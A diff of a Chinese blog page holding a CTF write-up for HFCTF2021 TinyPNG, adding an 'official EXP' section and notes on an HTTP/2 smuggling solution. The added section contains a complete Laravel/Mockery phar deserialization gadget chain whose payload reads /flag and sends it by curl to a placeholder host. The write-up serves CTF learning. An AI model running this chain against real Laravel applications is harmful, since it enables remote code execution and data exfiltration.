@@ -48,7 +48,7 @@
         content="2021-04-29">
       <meta
         property="og:article:modified_time"
-        content="2021-05-17">
+        content="2021-05-18">
       <meta
         property="og:article:author"
         content="Switch">
@@ -316,7 +316,7 @@
     
     
       <span class="dot"></span>
-      <span>2.1k 字</span>
+      <span>2.5k 字</span>
     
   </div>
   
@@ -346,6 +346,7 @@
     <h2 id="HFCTF2021-TinyPNG"><a href="#HFCTF2021-TinyPNG" class="headerlink" title="HFCTF2021 TinyPNG"></a>HFCTF2021 TinyPNG</h2><p>感谢 Naivekun 师傅的帮助</p>
 <p>因为题目没有给全环境，所以自己 docker 搭了个环境，和 Buu 上的好像不太一样，回头再研究</p>
 <p>docker 环境我会放在我的 GitHub 上，<a target="_blank" rel="noopener" href="https://github.com/ChrisLiKaiyuan/HFCTF2021_TinyPNG">复现环境</a></p>
+<p>ZeddYu 师傅说将 HTTP2 走私的环境放到 GitHub 上了，<a target="_blank" rel="noopener" href="https://github.com/ZeddYu/HTTP-Smuggling-Lab">H2走私环境</a></p>
 <h3 id="阅读源码"><a href="#阅读源码" class="headerlink" title="阅读源码"></a>阅读源码</h3><p>先阅读源码，搞清楚这个 Web 应用的具体功能和流程</p>
 <p>Laravel 框架的默认路由位于 <code>routes/web.php</code> 下 </p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -497,6 +498,7 @@
 <p>所以修洞很简单，直接注释掉<code>/image</code>路由即可</p>
 <h2 id="打洞"><a href="#打洞" class="headerlink" title="打洞"></a>打洞</h2><p>题目给了<code>Apache</code>的配置文件，开启了目录重写</p>
 <p>所以访问<code>/index.php/image</code>即可访问到<code>/image</code>路由</p>
+<p>我一开始看这个题目配了 HTTPS，想起来 4qE 比赛之前给我发的那篇推文，以为要打一个走私。结果是这样就绕过了。</p>
 <p>然后这一题可以上传文件，可以读取文件，打一个 <strong>phar 反序列化</strong></p>
 <p>参考文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9318">一道CTF题引起的对laravel v8.32.1序列化利用链挖掘</a></p>
 <p>题目环境里给出了 Laravel 的版本</p>
@@ -699,6 +701,106 @@ O:64:"Symfony\Component\Routing\Loader\Configurator\ImportConfigurator":1:&#123;
 <p>但是 phar 反序列化已经执行了，所以会在 <code>public</code> 目录生成一个 <code>1.php</code></p>
 <p><img src="image-20210429190820.png" alt="image-20210429190820" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="image-20210429190820.png" class="lozad post-image"></p>
 <p>访问 <code>/1.php</code> 即可</p>
+<h3 id="官方版本-EXP"><a href="#官方版本-EXP" class="headerlink" title="官方版本 EXP"></a>官方版本 EXP</h3><p>参考了 ZeddYu 师傅的推文。</p>
+<p>本地环境和 Buu 远程环境不太一样，我的 EXP 好像没打通，官方解用了另一条链。</p>
+<p>有兴趣的师傅可以跟一下这条链。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Bus</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">class</span> <span class="token class-name">Dispatcher</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">queueResolver</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Mockery<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>EvalLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'load'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">class</span> <span class="token class-name">PendingBroadcast</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">events</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Illuminate<span class="token punctuation">\</span>Bus<span class="token punctuation">\</span>Dispatcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">event</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BroadcastEvent</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name">BroadcastEvent</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">connection</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Mockery<span class="token punctuation">\</span>Generator<span class="token punctuation">\</span>MockDefinition</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Support</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">class</span> <span class="token class-name">MessageBag</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$messages</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$format</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$inner</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">format</span> <span class="token operator">=</span> <span class="token variable">$inner</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Loader</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">class</span> <span class="token class-name">EvalLoader</span>
+    <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Generator</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">class</span> <span class="token class-name">MockDefinition</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$code</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$evilCode</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$evilCode</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MockConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">class</span> <span class="token class-name">MockConfiguration</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefg'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php $s=base64_encode(file_get_contents("/flag"));system("curl http://xx.xx.xx.xx:5555/?a=".$s);exit; ?>'</span><span class="token punctuation">;</span>
+    <span class="token variable">$expected</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Illuminate<span class="token punctuation">\</span>Support<span class="token punctuation">\</span>MessageBag</span><span class="token punctuation">(</span><span class="token variable">$expected</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp2.phar.tar.gz"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp2.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">convertToExecutable</span><span class="token punctuation">(</span><span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">TAR</span><span class="token punctuation">,</span> <span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">GZ</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a&lt;?php __HALT_COMPILER();?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="HTTP2-走私"><a href="#HTTP2-走私" class="headerlink" title="HTTP2 走私"></a>HTTP2 走私</h3><p>原来 <code>/index.php/image</code> 真的是非预期。</p>
+<p>ZeddYu 师傅的推文里有提到 HTTP2 走私才是预期解。</p>
+<p>我这里贴一下 4qE 发给我的文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237140">BlackHat：HTTP 请求走私的新变体、新防御</a></p>
+<p>等我把走私复现了再更新博客 233</p>
 
   </div>
   <div>
@@ -789,7 +891,7 @@ O:64:"Symfony\Component\Routing\Loader\Configurator\ImportConfigurator":1:&#123;
     style="padding-right: 2px;">
   </i>目录
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2021-TinyPNG"><span class="toc-text">HFCTF2021 TinyPNG</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%85%E8%AF%BB%E6%BA%90%E7%A0%81"><span class="toc-text">阅读源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%B4%9E"><span class="toc-text">修洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E6%B4%9E"><span class="toc-text">打洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ImportConfigurator-%E7%B1%BB"><span class="toc-text">ImportConfigurator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ValidGenerator-%E7%B1%BB"><span class="toc-text">ValidGenerator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DefaultGenerator-%E7%B1%BB"><span class="toc-text">DefaultGenerator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-text">调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">phar 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2021-TinyPNG"><span class="toc-text">HFCTF2021 TinyPNG</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%85%E8%AF%BB%E6%BA%90%E7%A0%81"><span class="toc-text">阅读源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%B4%9E"><span class="toc-text">修洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E6%B4%9E"><span class="toc-text">打洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ImportConfigurator-%E7%B1%BB"><span class="toc-text">ImportConfigurator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ValidGenerator-%E7%B1%BB"><span class="toc-text">ValidGenerator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DefaultGenerator-%E7%B1%BB"><span class="toc-text">DefaultGenerator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-text">调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">phar 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E7%89%88%E6%9C%AC-EXP"><span class="toc-text">官方版本 EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP2-%E8%B5%B0%E7%A7%81"><span class="toc-text">HTTP2 走私</span></a></li></ol></li></ol>
 </div></main>
             <aside class="left-column">
               
@@ -851,7 +953,7 @@ O:64:"Symfony\Component\Routing\Loader\Configurator\ImportConfigurator":1:&#123;
     style="padding-right: 2px;">
   </i>目录
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2021-TinyPNG"><span class="toc-text">HFCTF2021 TinyPNG</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%85%E8%AF%BB%E6%BA%90%E7%A0%81"><span class="toc-text">阅读源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%B4%9E"><span class="toc-text">修洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E6%B4%9E"><span class="toc-text">打洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ImportConfigurator-%E7%B1%BB"><span class="toc-text">ImportConfigurator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ValidGenerator-%E7%B1%BB"><span class="toc-text">ValidGenerator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DefaultGenerator-%E7%B1%BB"><span class="toc-text">DefaultGenerator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-text">调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">phar 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2021-TinyPNG"><span class="toc-text">HFCTF2021 TinyPNG</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%85%E8%AF%BB%E6%BA%90%E7%A0%81"><span class="toc-text">阅读源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%B4%9E"><span class="toc-text">修洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E6%B4%9E"><span class="toc-text">打洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ImportConfigurator-%E7%B1%BB"><span class="toc-text">ImportConfigurator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ValidGenerator-%E7%B1%BB"><span class="toc-text">ValidGenerator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DefaultGenerator-%E7%B1%BB"><span class="toc-text">DefaultGenerator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-text">调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">phar 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E7%89%88%E6%9C%AC-EXP"><span class="toc-text">官方版本 EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP2-%E8%B5%B0%E7%A7%81"><span class="toc-text">HTTP2 走私</span></a></li></ol></li></ol>
       </div>
     </article>
   
@@ -904,7 +1006,7 @@ O:64:"Symfony\Component\Routing\Loader\Configurator\ImportConfigurator":1:&#123;
     style="padding-right: 2px;">
   </i>目录
 </div>
-<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2021-TinyPNG"><span class="toc-text">HFCTF2021 TinyPNG</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%85%E8%AF%BB%E6%BA%90%E7%A0%81"><span class="toc-text">阅读源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%B4%9E"><span class="toc-text">修洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E6%B4%9E"><span class="toc-text">打洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ImportConfigurator-%E7%B1%BB"><span class="toc-text">ImportConfigurator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ValidGenerator-%E7%B1%BB"><span class="toc-text">ValidGenerator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DefaultGenerator-%E7%B1%BB"><span class="toc-text">DefaultGenerator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-text">调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">phar 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2021-TinyPNG"><span class="toc-text">HFCTF2021 TinyPNG</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%85%E8%AF%BB%E6%BA%90%E7%A0%81"><span class="toc-text">阅读源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%B4%9E"><span class="toc-text">修洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E6%B4%9E"><span class="toc-text">打洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ImportConfigurator-%E7%B1%BB"><span class="toc-text">ImportConfigurator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ValidGenerator-%E7%B1%BB"><span class="toc-text">ValidGenerator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DefaultGenerator-%E7%B1%BB"><span class="toc-text">DefaultGenerator 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-text">调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">phar 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E7%89%88%E6%9C%AC-EXP"><span class="toc-text">官方版本 EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP2-%E8%B5%B0%E7%A7%81"><span class="toc-text">HTTP2 走私</span></a></li></ol></li></ol>
     </article>
   
   
